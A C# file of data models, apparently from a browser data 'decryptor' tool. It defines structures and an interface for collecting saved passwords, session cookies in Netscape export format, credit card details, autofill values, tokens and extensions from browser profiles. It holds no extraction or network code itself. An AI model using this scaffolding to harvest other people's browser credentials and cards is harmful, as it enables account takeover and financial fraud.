using System;
using System.Text;
using System.Collections;
using System.Collections.Generic;

namespace YandexDecryptor.Helpers
{
    public sealed class Models
    {
        public struct PasswordEntry
        {
            public string Hostname { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
            public string Application { get; set; }
            public string Profile { get; set; }

            public override string ToString()
            {
                StringBuilder sb = new StringBuilder();

                if (Application != null && Profile != null)
                {
                    sb.AppendFormat("[\"{0}\" : \"{1}\"]\n", Application, Profile);
                }
                else if (Application != null)
                {
                    sb.AppendFormat("[\"{0}\"]\n", Application);
                }

                sb.AppendFormat("\tHostname: {0}\n\tUsername: {1}\n\tPassword: {2}\n", Hostname, Username, Password);

                return sb.ToString();
            }
        }

        public struct Cookie
        {
            public string HostKey { get; set; }
            public string Name { get; set; }
            public string Path { get; set; }
            public string ExpiresUtc { get; set; }
            public string Value { get; set; }
            public string IsSecure { get; set; }

            public override string ToString()
            {
                // Convert ExpiresUtc to Unix time (if it's in UTC format)
                string expires = ExpiresUtc;
                if (DateTime.TryParse(ExpiresUtc, out DateTime expiresUtc))
                {
                    DateTime unixEpochStart = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                    TimeSpan timeSpan = expiresUtc.ToUniversalTime() - unixEpochStart;
                    expires = timeSpan.TotalSeconds.ToString();
                }

                // Determine if the cookie is secure and HTTP-only
                string isSecure = IsSecure == "1" ? "TRUE" : "FALSE";
                string isHttpOnly = HostKey.StartsWith(".") ? "TRUE" : "FALSE";

                // Format according to the Netscape format
                return string.Format("{0}\t{1}\t{2}\t{3}\t{4}\t{5}\t{6}", HostKey, isHttpOnly, Path, isSecure, expires, Name, Value);
            }
        }

        public struct CreditCard
        {
            public string Number { get; set; }
            public string ExpYear { get; set; }
            public string ExpMonth { get; set; }
            public string Name { get; set; }

            public override string ToString()
            {
                return string.Format("{0} ({1})\n{2} / {3}\n", Number, Name, ExpMonth, ExpYear);
            }
        }

        public struct AutoFill 
        {
            public string Name { get; set; }
            public string Value { get; set; }

            public override string ToString()
            {
                return string.Format("{0}\n{1}\n", Name, Value);
            }
        }

        public struct FileData
        {
            public string Name { get; set; }
            public byte[] Data { get; set; }
        }

        public interface IBrowser
        {
            bool Exists();
            string GetName();
            IEnumerable<Models.BrowserProfile> GetProfiles();
            IEnumerable<Models.CreditCard> GetCards(Models.BrowserProfile profile);
            IEnumerable<Models.PasswordEntry> GetPasswords(Models.BrowserProfile profile);
            IEnumerable<Models.Cookie> GetCookies(Models.BrowserProfile profile);
            IEnumerable<Models.AutoFill> GetAutoFills(Models.BrowserProfile profile);
            IEnumerable<Models.PasswordEntry> GetTokens(Models.BrowserProfile profile);
            IEnumerable<Models.FileData> GetExtensions(Models.BrowserProfile profile);
        }

        public struct BrowserProfile
        {
            public string Name { get; set; }
            public string InternalName { get; set; }
        }


        public static string IterateStructure(IEnumerable items)
        {
            StringBuilder sb = new StringBuilder();

            foreach (object item in items)
            {
                sb.AppendLine(item.ToString());
            }

            return sb.ToString();
        }

    }
}
